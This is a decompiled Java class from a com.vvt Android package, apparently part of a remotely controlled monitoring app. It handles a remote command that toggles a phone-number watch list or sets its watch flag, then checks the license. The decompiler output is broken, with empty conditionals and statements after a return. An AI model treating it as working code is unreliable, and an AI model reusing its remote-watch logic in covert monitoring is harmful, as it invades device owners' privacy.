package com.vvt.appengine.a;

import com.vvt.appengine.AppEngine1;
import com.vvt.appengine.i;
import com.vvt.preference.FxPreferenceType;
import com.vvt.preference.PrefWatchList;
import com.vvt.remotecontrol.ControlCommand;
import java.util.List;

public class by
{
  private static final boolean a = com.vvt.ak.a.a;
  
  public boolean a(ControlCommand paramControlCommand, AppEngine1 paramh)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = paramh.n;
    Object localObject2 = FxPreferenceType.WATCH_LIST;
    localObject2 = (PrefWatchList)((com.vvt.preference.b)localObject1).a((FxPreferenceType)localObject2);
    Object localObject3 = paramControlCommand.getData();
    boolean bool2 = localObject3 instanceof Boolean;
    boolean bool4;
    if (bool2)
    {
      localObject3 = (Boolean)localObject3;
      boolean bool3 = ((Boolean)localObject3).booleanValue();
      bool2 = a;
      if (bool2) {}
      ((PrefWatchList)localObject2).setEnabled(bool3);
      ((com.vvt.preference.b)localObject1).b();
      bool1 = a;
      if (bool1) {}
      localObject2 = i.b(paramh).b();
      localObject3 = paramh.k;
      localObject1 = paramh.o;
      String str = paramh.l.d();
      bool3 = ((com.vvt.license.b)localObject3).a((com.vvt.productinfo.a)localObject1, str);
      bool4 = a;
      if ((!bool4) || (localObject2 != null))
      {
        bool4 = a;
        if (bool4) {}
        bool4 = a;
        if (bool4) {}
        bool4 = a;
        if (bool4) {}
        i.c(paramh, (List)localObject2, bool3);
      }
    }
    for (;;)
    {
      bool1 = a;
      if (bool1) {}
      return true;
      bool4 = a;
      if (!bool4) {
        break;
      }
      break;
      bool2 = localObject3 instanceof Integer;
      if (bool2)
      {
        bool2 = a;
        if (bool2) {}
        localObject3 = (Integer)localObject3;
        int i = ((Integer)localObject3).intValue();
        ((PrefWatchList)localObject2).setWatchFlag(i);
        ((com.vvt.preference.b)localObject1).b();
        bool1 = a;
        if (!bool1) {}
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/by.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */